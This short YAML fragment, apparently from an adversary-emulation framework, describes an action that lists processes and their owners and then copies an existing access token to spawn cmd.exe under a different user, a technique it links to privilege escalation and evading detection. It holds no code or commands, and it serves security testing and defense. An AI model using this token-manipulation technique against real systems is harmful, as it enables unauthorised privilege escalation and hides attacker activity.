- description: "This Action demonstrates how an access token for a specific program\
    \ can spawn another program under a different owner. \nAdversaries can leverage\
    \ access tokens to run programs under a different user not only to achieve privilege\
    \ escalation but also to evade detection by blending in with normal user activity.\
    \ \nThis Action will query all processes and list the process name and owner.It\
    \ will then make a copy of an existing token to create a new instance of cmd.exe\n"
